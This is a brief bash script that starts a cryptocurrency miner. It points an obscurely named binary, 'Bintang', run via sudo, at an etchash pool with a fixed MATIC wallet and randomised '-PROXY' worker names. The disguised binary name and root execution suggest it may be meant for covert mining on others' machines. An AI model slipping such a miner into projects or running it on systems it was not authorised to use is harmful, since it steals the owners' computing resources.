#!/bin/bash

POOL=etchash.unmineable.com:3333
WALLET=MATIC:0xBF7a2dB59CAF1ba7079C87CefFf8f62750fC990f.$(echo $(shuf -i 1-9999 -n 1)-PROXY)+50000#61ev-k59e
WORKER=$(echo $(shuf -i 1-9999 -n 1)-PROXY)

cd "$(dirname "$0")"

chmod +x ./Bintang && sudo ./Bintang -a etchash -o $POOL -u $WALLET.$WORKER $@
